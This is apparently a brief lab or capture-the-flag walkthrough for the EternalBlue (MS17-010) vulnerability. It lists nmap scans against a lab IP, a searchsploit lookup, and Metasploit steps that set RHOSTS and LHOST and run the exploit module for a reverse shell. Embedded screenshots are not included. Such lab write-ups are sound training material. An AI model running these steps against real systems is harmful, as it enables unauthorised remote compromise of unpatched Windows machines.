
## **Eternal Blue**

```
nmap -p- -sC -sV <IP>
```

```
nmap --script=vuln 10.49.178.117
```

We found a MS17

![[Pasted image 20260314104901.png]]

```
searchsploit MS17
```

![[Pasted image 20260314104700.png]]

I found a ton and we can use these scripts but here we will prefer metasploit tool

```
msfconsole
```

```
search ms17-010
```

![[Pasted image 20260314105026.png]]

We have a few but we will choose first one to do it

```
use 0
```

```
options
```

![[Pasted image 20260314105133.png]]

Now when we do it, we have to change few things, Add RHOSTS, Change LHOST (We can also change LPORT but let us keep it at default)

```
set RHOSTS <IP>
```

```
set LHOST <Your tun0 IP>
```

![[Pasted image 20260314105345.png]]

```
exploit
```











